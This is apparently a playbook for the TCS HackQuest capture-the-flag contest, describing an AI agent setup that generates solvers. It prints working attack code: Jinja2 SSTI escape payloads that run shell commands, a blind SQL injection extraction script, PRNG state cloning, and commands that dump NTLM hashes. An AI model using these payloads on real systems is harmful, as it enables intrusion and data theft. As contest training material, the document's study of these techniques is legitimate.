# 🏆 TCS HackQuest — Advanced AI Co-Pilot Battle Playbook
> **Operational Guide for Winning Round 1 & Round 2 Using the Autonomous CTF AI Orchestrator & Vector RAG Ecosystem**

---

## 🌐 Mission Control & Live Infrastructure Directory

Your complete autonomous CTF co-pilot is deployed across specialized cloud and edge platforms:

| Component | Endpoint / URL | Purpose during HackQuest |
|---|---|---|
| **Live Web Command Center** | [`https://ctf-agent-orchestrator.vercel.app`](https://ctf-agent-orchestrator.vercel.app) | Single-pane-of-glass dashboard for challenge analysis, live tool traces, and solver execution. |
| **Local Command Center (Offline Fallback)** | `http://localhost:8080` | Local high-speed dashboard running directly on your machine. |
| **Module 1: ZeroGPU Vector RAG** | [`https://outstandingom-vector.hf.space`](https://outstandingom-vector.hf.space) | High-memory (16 GB RAM + A10G GPU) semantic vector store pre-seeded with advanced exploits. |
| **Module 2: Render MCP Gateway** | [`https://mcp-server-2sl7.onrender.com`](https://mcp-server-2sl7.onrender.com) | Autonomous GitHub interface with 2-Step Deletion Protection for saving solvers and writeups. |
| **DNA Knowledge Graph** | [`https://outstandingom-knowledge-graph-env.hf.space`](https://outstandingom-knowledge-graph-env.hf.space) | Multi-hop conceptual reasoning engine for complex CTF attack chains. |
| **GitHub Orchestrator Repo** | [`https://github.com/outstandingom/ctf-agent-orchestrator`](https://github.com/outstandingom/ctf-agent-orchestrator) | Full source code, tool definitions, and commit history. |

---

## 🎯 Why Basic Exploits Don't Win HackQuest (and What Does)

In **TCS HackQuest**, basic `' OR '1'='1' --` or trivial JWT `alg: none` tricks only appear in introductory warm-ups. Serious competitors encounter **hardened challenges** designed by red-teamers:

1. **Web**: Blind Time-based SQLi with WAF filters, Server-Side Template Injection (SSTI) with restricted globals, and Insecure Deserialization.
2. **Crypto**: Mersenne Twister (MT19937) internal state recovery, RSA Wiener's small $d$ attacks, and Hash Length Extension attacks.
3. **Reversing**: Symbol-stripped binaries, anti-debugging tricks (`ptrace` detection), PyInstaller compiled bytecode, and complex state machines best solved via **Symbolic Execution (Angr)**.
4. **Forensics**: USB HID Keystroke extraction from `.pcap` captures, memory dump extraction via Volatility 3, and high-speed Steghide dictionary cracking.

Your AI Agent has been updated and pre-seeded with all of these advanced exploit vectors.

---

## ⚔️ The 4 Core HackQuest Domains & Attack Playbooks

```
                              ┌────────────────────────────────────────────────────────┐
                              │             TCS HACKQUEST PROBLEM SOLVER               │
                              └───────────────────────────┬────────────────────────────┘
                                                          │
          ┌───────────────────────┬───────────────────────┴───────────────────────┬───────────────────────┐
          ▼                       ▼                                               ▼                       ▼
┌───────────────────┐   ┌───────────────────┐                           ┌───────────────────┐   ┌───────────────────┐
│ 1. ADVANCED WEB   │   │ 2. CRYPTO & PRNG  │                           │ 3. REVERSING / PWN│   │ 4. FORENSICS/LOGS │
├───────────────────┤   ├───────────────────┤                           ├───────────────────┤   ├───────────────────┤
│ • Jinja2 SSTI RCE │   │ • MT19937 Cloner  │                           │ • Angr Z3 Solver  │   │ • USB HID PCAP    │
│ • Blind SQLi Bin  │   │ • RSA Wiener      │                           │ • PyInstaller/pyc │   │ • Volatility 3    │
│ • Pickle RCE      │   │ • HashPump MAC    │                           │ • ltrace / strcmp │   │ • Stegseek Crack  │
│ • Cloud SSRF IAM  │   │ • Coppersmith RSA │                           │ • Anti-Debug Hook │   │ • HQX{...} Hunter │
└───────────────────┘   └───────────────────┘                           └───────────────────┘   └───────────────────┘
```

---

### 1. 🌐 Advanced Web Application Security

#### A. Server-Side Template Injection (SSTI) Sandbox Escapes (Flask / Jinja2)
* **When you see**: User input reflected in template rendering, error pages, or profile names (`Hello {{ name }}`).
* **Agent Strategy**: Instead of naive payloads, the agent generates Python subclass traversal payloads bypassing quotes, underscores, and built-ins:
  ```jinja2
  {{ ''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['popen']('cat flag* /flag /app/flag*').read() }}
  ```
* **Filter-Bypass Variant** (no quotes, no underscores):
  ```jinja2
  {{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat /flag').read() }}
  ```

#### B. Blind Boolean / Time-Based SQLi with Binary Search
* **When you see**: No output or errors reflected, but page response length changes or delays with `pg_sleep()` / `sleep()`.
* **Agent Strategy**: Generates an automated Python script using **binary search** ($O(N \log K)$) across ASCII values $32\dots126$ to extract the flag in seconds rather than hours:
  ```python
  import requests
  url = 'http://target-hackquest.com/profile'
  flag = ''
  for pos in range(1, 50):
      low, high = 32, 126
      while low <= high:
          mid = (low + high) // 2
          payload = f"admin' AND (SELECT unicode(substr(flag,{pos},1)) FROM secrets) > {mid} --"
          r = requests.get(url, params={'user': payload})
          if 'Welcome' in r.text:
              low = mid + 1
          else:
              high = mid - 1
      flag += chr(low)
      if flag.endswith('}'): break
  ```

#### C. Insecure Python Object Deserialization (`pickle.loads` RCE)
* **When you see**: Base64 encoded cookies or tokens that start with `gASV...` (standard Python pickle header).
* **Agent Strategy**: Generates a malicious object payload implementing `__reduce__` to trigger immediate remote command execution.

---

### 2. 🔑 Advanced Cryptography & PRNG Reconstruction

#### A. Mersenne Twister (MT19937) Internal State Cloning (`randcrack`)
* **When you see**: A server generates tokens or OTPs using Python's `random.getrandbits(32)` or `random.randint()`.
* **The Vulnerability**: You **do not** need the seed or timestamp! Mersenne Twister has a state of exactly 624 32-bit values. Once 624 outputs are collected, state cloning is 100% deterministic.
* **Agent Strategy**:
  ```python
  from randcrack import RandCrack
  rc = RandCrack()
  for num in server_624_outputs:
      rc.submit(num)
  # Predict future outputs identically to the server:
  next_token = rc.predict_getrandbits(32)
  ```

#### B. RSA Wiener's Small Private Exponent Attack ($d < \frac{1}{3} n^{0.25}$)
* **When you see**: Massive modulus $n$ ($2048+$ bits), public exponent $e$ close to $n$, and small decryption time.
* **Agent Strategy**: Employs continued fraction expansion of $\frac{e}{n}$ using `owiener` to recover $d$ in polynomial time ($<1$ second).

#### C. Hash Length Extension Attacks (MD5 / SHA-1 / SHA-256)
* **When you see**: Authentication tokens constructed as $\text{Hash}(\text{secret} \parallel \text{data})$.
* **Agent Strategy**: Uses `hashpump` to append `&admin=true` and calculate the valid cryptographic hash signature without ever needing to know the secret key.

---

### 3. 🛠️ Advanced Reverse Engineering & Symbolic Execution

#### A. Zero-Disassembly Solving with Angr (Symbolic Execution)
* **When you see**: A compiled crackme with complex arithmetic, nested branching, or byte scrambling that would take 2 hours to reverse in Ghidra.
* **Agent Strategy**: Defines symbolic input variables using `claripy` and instructs `angr` to explore the state tree to find the `Correct!` basic block while avoiding `Wrong!`:
  ```python
  import angr, claripy
  proj = angr.Project('./crackme', auto_load_libs=False)
  flag = claripy.BVS('flag', 8 * 32)
  state = proj.factory.entry_state(stdin=flag)
  simgr = proj.factory.simulation_manager(state)
  simgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1),
                avoid=lambda s: b'Wrong' in s.posix.dumps(1))
  if simgr.found:
      print('[+] Flag:', simgr.found[0].solver.eval(flag, cast_to=bytes))
  ```

#### B. PyInstaller Executables & `.pyc` Bytecode Decompilation
* **When you see**: An `.exe` that unzips into a Python runtime, or a `.pyc` file.
* **Agent Strategy**:
  1. Unpacks using `pyinstxtractor.py challenge.exe`.
  2. Fixes the corrupted 16-byte magic header (extracting magic bytes from `struct.pyc`).
  3. Decompiles using `uncompyle6` or `pycdc` (decompyle++) to reproduce raw source code.

#### C. Dynamic Interception via `ltrace` / `strcmp` Hooking
* **When you see**: Binary verifying password input against dynamic memory.
* **Agent Strategy**: Generates dynamic execution commands:
  ```bash
  ltrace -s 200 -e strcmp ./challenge <<< 'TEST_STRING'
  ```
  The target plaintext password/flag is revealed in the second argument of `strcmp`.

---

### 4. 🔍 Advanced Forensics & Packet / Memory Analysis

#### A. USB HID Keystroke Packet Carving from `.pcap`
* **When you see**: A Wireshark capture where protocols show `USB` and `URB_INTERRUPT in` instead of standard HTTP.
* **Agent Strategy**:
  1. Extracts leftover capture data (`usb.capdata`):
     ```bash
     tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > keys.txt
     ```
  2. Runs mapping script converting Byte 2 (HID keycodes) to ASCII characters, factoring in Byte 0 (Shift key).

#### B. Memory Dump Analysis with Volatility 3
* **When you see**: A `.raw`, `.dmp`, or `.vmem` image file.
* **Agent Strategy**:
  - `vol -f memory.raw windows.malfind`: Identifies injected DLLs and shellcode.
  - `vol -f memory.raw windows.cmdline`: Extracts command history.
  - `vol -f memory.raw windows.hashdump`: Dumps NTLM password hashes.

#### C. Stegseek Ultra-Fast Passphrase Cracking
* **When you see**: A JPG or WAV with suspected Steghide payload.
* **Agent Strategy**: Recommends `stegseek secret.jpg rockyou.txt`, which tests millions of passwords per second directly without slow process spawning.

---

## 🕹️ Step-by-Step Operator Guide: Using the Vercel Dashboard

Open your live web deployment:
👉 **[https://ctf-agent-orchestrator.vercel.app](https://ctf-agent-orchestrator.vercel.app)**

```
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│ 1. INSPECT THE HUD                                                                      │
│    Ensure HF Vector RAG, Render MCP, and DNA Graph show green Online indicators.        │
├─────────────────────────────────────────────────────────────────────────────────────────┤
│ 2. CHOOSE YOUR ENGINE                                                                   │
│    • Groq (Qwen 27B LPU): Ultra-fast (~1.5s per turn). Best for fast solving.          │
│    • Anthropic Claude 3.5: Deep mathematical & reverse-engineering reasoning.           │
├─────────────────────────────────────────────────────────────────────────────────────────┤
│ 3. PASTE THE CHALLENGE                                                                  │
│    Paste error logs, disassembled snippets, ciphertexts, or network headers.            │
├─────────────────────────────────────────────────────────────────────────────────────────┤
│ 4. WATCH THE AUTONOMOUS EXECUTION TRACE                                                 │
│    • Turn 1: search_knowledge_base (fetches advanced exploit math from ZeroGPU Space)   │
│    • Turn 2: crypto_cyberchef_analyzer or reverse_engineering_inspector                 │
│    • Turn 3: Synthesizes complete Python solver                                         │
├─────────────────────────────────────────────────────────────────────────────────────────┤
│ 5. 1-CLICK COMMIT & DEPLOY                                                              │
│    Click "Commit Solver to GitHub" to save the exploit script into your repo            │
│    via the Render MCP Gateway.                                                          │
└─────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 🧰 Recommended Local Environment Setup (Kali Linux / WSL)

Ensure your testing machine has these essential packages installed so you can run the scripts generated by your agent:

```bash
# Python Exploitation Toolkit
pip install pwntools requests httpx beautifulsoup4 pycryptodome gmpy2 randcrack hashpumpy angr claripy

# Binary & Stego Utilities
sudo apt update && sudo apt install -y binwalk tshark foremost steghide ltrace strace upx-ucl john

# Install Stegseek (Ultra-Fast Steghide Cracker)
sudo apt install -y stegseek
```

---

## 🏁 Summary Checklist for HackQuest Success

1. **Keep the dashboard open**: [`https://ctf-agent-orchestrator.vercel.app`](https://ctf-agent-orchestrator.vercel.app).
2. **Classify fast**: Determine if the problem is Web, Crypto, Reversing, or Forensics.
3. **Let the agent do the heavy math**: Use the ZeroGPU RAG to retrieve binary search loops, Angr scripts, or PRNG state cloning logic.
4. **Flag format**: HackQuest flags follow **`HQX{...}`**. The agent automatically scans and validates this format.
5. **Commit solvers**: Maintain a verified audit trail in your GitHub repositories via your Render MCP server.
